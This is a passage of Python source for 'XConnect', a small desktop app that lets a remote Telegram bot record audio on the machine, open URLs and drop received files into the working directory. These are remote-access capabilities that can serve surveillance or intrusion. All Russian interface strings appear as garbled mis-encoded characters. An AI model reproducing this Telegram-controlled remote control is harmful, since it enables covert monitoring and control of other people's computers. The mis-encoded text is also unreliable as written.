                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (–Ω–∞–ø—Ä–∏–º–µ—Ä, /recordaudio 10).")

                    elif message.startswith("/openurl"):
                        url = message[len("/openurl"):].strip()
                        if not url:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: URL –Ω–µ —É–∫–∞–∑–∞–Ω.")
                            continue

                        result = SystemCommands.open_url(url)
                        TelegramBot.send_message(result)

                    elif "document" in update.get("message", {}):
                        file_id = update["message"]["document"]["file_id"]
                        file_name = update["message"]["document"]["file_name"]
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

                    elif "audio" in update.get("message", {}):
                        file_id = update["message"]["audio"]["file_id"]
                        file_name = update["message"]["audio"]["file_name"]
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

                    elif "voice" in update.get("message", {}):
                        file_id = update["message"]["voice"]["file_id"]
                        file_name = "voice_message.ogg"
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

                    elif "photo" in update.get("message", {}):
                        file_id = update["message"]["photo"][-1]["file_id"]
                        file_name = "photo.jpg"
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

        except requests.RequestException as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ Telegram API: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")
            time.sleep(5)

def start_connection():
    TelegramBot.send_message("üöÄ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ.")
    global telegram_thread
    telegram_thread = threading.Thread(target=handle_telegram_commands, daemon=True)
    telegram_thread.start()
    start_button.configure(state=tk.DISABLED)
    stop_button.configure(state=tk.NORMAL)

def stop_connection():
    TelegramBot.send_message("üî¥ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ.")
    stop_button.configure(state=tk.DISABLED)
    start_button.configure(state=tk.NORMAL)

def create_gui():
    ctk.set_appearance_mode("System")
    ctk.set_default_color_theme("blue")

    app = ctk.CTk()
    app.title("XConnect")
    app.geometry("300x150")

    global start_button, stop_button
    start_button = ctk.CTkButton(app, text="–ü–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è", command=start_connection)
    start_button.pack(pady=20)

    stop_button = ctk.CTkButton(app, text="–û—Ç–∫–ª—é—á–∏—Ç—å—Å—è", command=stop_connection, state=tk.DISABLED)
    stop_button.pack(pady=20)

    app.mainloop()

if __name__ == "__main__":
    create_gui()